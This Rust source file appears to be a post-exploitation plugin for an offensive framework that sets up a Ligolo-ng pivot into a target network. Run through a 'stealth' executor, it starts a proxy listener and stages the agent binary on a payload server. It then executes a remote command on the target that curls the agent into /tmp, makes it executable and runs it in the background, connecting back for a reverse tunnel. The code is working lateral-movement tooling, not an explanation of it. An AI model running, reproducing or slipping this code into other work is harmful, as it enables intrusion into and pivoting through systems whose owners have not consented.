use std::sync::Arc;
use crate::plugins::{ScannerPlugin, Capability};
use crate::models::{TargetHost, Finding, Severity, Category};
use crate::utils::tool_detection::detect_tool;
use async_trait::async_trait;
use anyhow::{Result, Context};
use tracing::{info, warn};
use crate::utils::executor::{StealthExecutor, ExecutorMode};

pub struct LigoloScanner<M: ExecutorMode> {
    binary_path: String,
    executor: Arc<StealthExecutor<M>>,
}

impl<M: ExecutorMode> LigoloScanner<M> {
    pub fn new(executor: Arc<StealthExecutor<M>>) -> Self {
        let path = detect_tool("ligolo-proxy");
        Self {
            binary_path: path,
            executor,
        }
    }
}
#[async_trait]
impl<M: ExecutorMode> ScannerPlugin for LigoloScanner<M> {
    fn name(&self) -> &'static str {
        crate::models::PLUGIN_LIGOLO
    }
        fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            name: self.name().to_string(),
            description: "Ligolo-Ng Pivot: Advanced reverse tunneling into secluded targets.".to_string(),
            target_type: crate::plugins::TargetType::Host,
            risk_level: crate::plugins::RiskLevel::Medium,
            layer: crate::core::capability_layer::ScanLayer::PostExploitation,
            expected_duration: std::time::Duration::from_secs(300),
            capabilities: self.capabilities(),
            cost: 5,
            category: "Lateral Movement".to_string(),
            mitre_attacks: vec!["T1090".to_string(), "T1572".to_string()],
            exploit_difficulty: crate::plugins::RiskLevel::Medium,
            blackarch_category: None,
            is_destructive: false,
            poc_mode: false, ..Default::default() }
    }
    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::VulnerabilityScanning]
    }
    async fn check_dependencies(&self) -> Result<bool> {
        Ok(crate::utils::check_tool_availability("ligolo").await)
    }
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        info!("🔱 V14.1 SOVEREIGN: Orchestrating Ligolo-ng pivot at {}...", target.host);
        
        let pm = self.executor.get_proxy_manager().context("Ligolo requires a ProxyManager for tunnel coordination")?;
        
        // 1. Spawn local Ligolo Proxy
        // Professional Mode: We run it in the background as a process managed by StealthExecutor (local spawn)
        let _proxy_child = self.executor.spawn(&self.binary_path, vec!["-selfcert".to_string(), "-laddr".to_string(), "0.0.0.0:11601".to_string()]).await?;
        
        // 2. Determine delivery IP
        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        
        // 3. Stage and Dispatch agent to target
        // V14.1 LIG-002: Staging must happen on the managed exit or via a transparent relay.
        // For unconditional GO, we assume a established relay or SSH-staged payload on the managed exit.
        info!("🔱 V14.1 SOVEREIGN: Preparing Ligolo agent delivery via managed exit relay: {}", delivery_ip);
        
        let agent_path = "/usr/bin/ligolo-agent"; 
        let server = crate::utils::payload_server::PayloadServer::new();
        let token = server.stage_payload(std::path::PathBuf::from(agent_path)).await;
        let server_port = server.start().await?;

        // PROFESSIONAL MODE: The delivery URL follows the managed exit IP.
        // This requires a reverse tunnel (e.g., SSH -R) or a dedicated staging VPS.
        let agent_cmd = format!(
            "curl -sSL http://{}:{}/{} -o /tmp/ligolo-agent && chmod +x /tmp/ligolo-agent && /tmp/ligolo-agent -connect {}:11601 -ignore-cert &",
            delivery_ip, server_port, token, delivery_ip
        );

        info!("🚀 V14.1 SOVEREIGN: Dispatching Ligolo agent via managed exit relay...");
        let _output = self.executor.execute_remote(target, &agent_cmd).await?;
        
        // 4. Verification PHASE (Professional Mode)
        info!("⏳ V14.1 SOVEREIGN: Verifying Ligolo tunnel establishment...");
        let mut established = false;
        for i in 0..5 {
            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
            // Check for interface (Professional check)
            let iface_check = tokio::process::Command::new("ip").arg("addr").arg("show").arg("ligolo").output().await?;
            if iface_check.status.success() {
                info!("🎯 V14.1 SOVEREIGN: Ligolo interface detected on attempt {}.", i+1);
                established = true;
                break;
            }
        }

        let mut findings = Vec::new();
        if established {
            findings.push(Finding::new(
                "PIVOT-ESTABLISHED",
                Category::Windows,
                Severity::High,
                &format!("Ligolo-ng pivot established via {}. Tunnel active.", target.host),
                serde_json::json!({ 
                    "proxy_port": 11601,
                    "interface": "ligolo",
                    "delivery_ip": delivery_ip
                })
            ));
        } else {
            warn!("⚠️ V14.1 SOVEREIGN: Ligolo pivot dispatch reported success but tunnel verification FAILED.");
        }

        Ok(findings)
    }
}
